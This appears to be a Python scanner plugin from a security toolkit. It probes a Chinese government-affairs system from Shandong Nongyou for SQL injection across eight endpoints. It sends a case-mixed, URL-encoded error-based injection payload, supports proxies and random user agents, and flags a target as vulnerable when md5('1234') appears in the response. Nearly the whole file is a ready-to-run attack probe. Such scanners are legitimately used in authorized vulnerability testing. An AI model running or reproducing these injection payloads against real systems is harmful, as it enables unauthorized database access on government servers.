#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友政务系统多处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-095250
         http://www.wooyun.org/bugs/wooyun-2010-097690
author: Ascotbe
reference: Lucifer
description: 山东农友软件公司政务系统存在多处SQL注入漏洞。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

urls=['/ckq/pllistOut.aspx?tname=1&CountryName=test',
            '/ckq/caiwgkview.aspx?tname=1&CountryName=test',
            '/newsymItemView/DynamicItemViewOut.aspx?tname=test&CountryName=test',
            '/newsymsum/VillagePersonalView.aspx?tname=test&CountryName=test',
            '/symItemManage/ItemSixth.aspx?id=1',
            '/symItemManage/ItemSecond.aspx?id=1',
            '/WebDefault3.aspx?CountryName=test&level=0',
            '/ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1%27AnD%20%28SeLeCt%206765%20FrOM%28SeLeCT%20CoUnT%28%2a%29%2CCOnCaT%28Md5%281234%29%2CFLooR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFoRMaTION_ScHeMA.CHaRAcTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27QXgv%27%3D%27QXgv']
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for turl in urls:
            payload = "%27%20AnD%20%28SeLeCt%201%20FrOm%28SeLeCt%20CoUnT%28%2a%29%2CCoNcAt%28Md5%281234%29%2CFlOoR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFOrMATiON_ScHeMA.CHaRaCTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27svkA%27%3D%27svkA%26CountryName%3D1"
            payload_url = scheme+"://"+url+turl +payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在农友政务系统多处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass